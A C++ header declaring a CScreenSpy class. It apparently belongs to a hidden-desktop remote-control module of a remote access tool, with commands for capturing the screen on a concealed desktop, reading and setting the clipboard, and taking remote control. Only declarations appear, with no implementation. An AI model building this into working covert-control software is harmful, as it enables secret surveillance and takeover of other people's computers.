#pragma once
#include <windows.h>
#include "CursorInfo.h"
#include "jpeglib.h"


#ifdef _WIN64
#ifdef _DEBUG
#pragma comment(lib, "turbojpeg_64_d.lib")
#else
#pragma comment(lib, "turbojpeg_64_R.lib")
#endif
#else
#ifdef _DEBUG
#pragma comment(lib, "turbojpeg_32_d.lib")
#else
#pragma comment(lib, "turbojpeg_32_r.lib")
#endif
#endif
enum
{
	TOKEN_FIRSTSCREEN_HIDE,
	TOKEN_NEXTSCREEN_HIDE,
	TOKEN_CLIPBOARD_TEXT_HIDE,
	TOKEN_SIZE_HIDE,
	COMMAND_NEXT_HIDE,
	COMMAND_FLUSH_HIDE,
	COMMAND_SCREEN_RESET_HIDE,
	COMMAND_SCREEN_FPS_HIDE,
	COMMAND_SCREEN_CAPTURE_LAYER_HIDE,
	COMMAND_SCREEN_GET_CLIPBOARD_HIDE,
	COMMAND_SCREEN_SETSCREEN_HIDE,
	COMMAND__SCREEN_ALGORITHM_RESET_HIDE,
	COMMAND_SCREEN_CONTROL_HIDE,
	COMMAND_SCREEN_SET_CLIPBOARD_HIDE,
	COMMAND_HIDE_USER,
	COMMAND_HIDE_CLOSE,
	COMMAND_SCREEN_ALGORITHM_HOME_HIDE,
	COMMAND_SCREEN_ALGORITHM_XVID_HIDE,
	COMMAND_COMMAND_SCREENUALITY60_HIDE,
	COMMAND_COMMAND_SCREENUALITY85_HIDE,
	COMMAND_COMMAND_SCREENUALITY100_HIDE,
};

struct EnumHwndsPrintData
{
	HDC hDc;
	HDC hDcScreen;
};

class CScreenSpy
{
public:
	CScreenSpy(HDESK temp_g_hDeskint, int biBitCount = 32, bool bIsGray = false, UINT nMaxFrameRate = 30);
	virtual ~CScreenSpy();
	LPVOID getFirstScreen(LPDWORD lpdwBytes);
	LPVOID getNextScreen(LPDWORD lpdwBytes);
	HDESK      g_hDesk;
	LPBITMAPINFO getBitmapInfo();
	UINT getBitmapInfoSize();
	BOOL SelectDesktop(TCHAR* name);
	BOOL SelectHDESK(HDESK new_desktop);
	BOOL SelectInputWinStation();
	void setAlgorithm(UINT nAlgorithm);
	void SendUALITY(int i);
	void SetFps(int nfps);
	int m_iScreenX;//获取桌面x坐标
	int m_iScreenY;//获取桌面y坐标
	float	fDpiRatio;  //DPI
	int    m_nFullWidth;
	int    m_nFullHeight;
	int m_SendUALITY;
private:
	int    m_biBitCount;
	UINT   m_bAlgorithm;
	UINT   m_nMaxFrameRate;
	bool   m_bIsGray;

	BYTE   m_nIncSize;
	int    m_nScanLine;

	HDC    m_hDeskTopDC;
	HDC    m_hLastMemDC;
	HDC    m_hCurrMemDC;
	HDC    m_hRectMemDC;
	LPVOID m_lpvLastBits;
	LPVOID m_lpvCurrBits;
	LPVOID m_lpvRectBits;
	LPBITMAPINFO m_lpbmi_full;
	LPBITMAPINFO m_lpbmi_rect;
	HBITMAP m_hLastBitmap;
	HBITMAP m_hCurrBitmap;
	HBITMAP m_hRectBitmap;

	LPBYTE m_changedBuffer;
	UINT   m_changedOffset;
	int    m_nPerLineDataSize;
	CCursorInfo	m_CursorInfo;
	LPBITMAPINFO ConstructBitmapInfo(int biBitCount, int biWidth, int biHeight);
	void WriteChangedBuffer(LPBYTE lpData, int nCount);
	void CopyChangedRect(LPRGNDATA lpRgnData, DWORD dwRgnSize);
	int  BMP_JPG(int width, int height, int cbit, int quality, void* input, void** output);
	BOOL ScanChangedRect(BOOL bCopyChangedRect);

	EnumHwndsPrintData data;

	HWND m_hDeskTopWnd;

	DWORD m_dwLastCapture;
	DWORD m_dwSleep;



};



